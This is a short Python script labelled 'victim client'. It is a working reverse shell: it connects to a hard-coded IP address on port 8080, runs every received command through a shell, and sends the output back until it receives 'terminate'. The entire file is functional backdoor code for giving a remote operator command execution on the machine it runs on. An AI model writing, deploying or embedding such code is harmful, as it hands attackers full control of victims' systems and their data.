# victim client

import socket
import subprocess

ip = "172.25.191.60"
port = 8080

def connect():
    Mysocket = socket.socket()
    Mysocket.connect((ip, port))

    while True:
        command = Mysocket.recv(1024)
        if "terminate" in command.decode():
            Mysocket.close()
            break

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            Mysocket.send(CMD.stdout.read())
            Mysocket.send(CMD.stderr.read())
def main():
    connect()
if __name__ == "__main__":
    main()
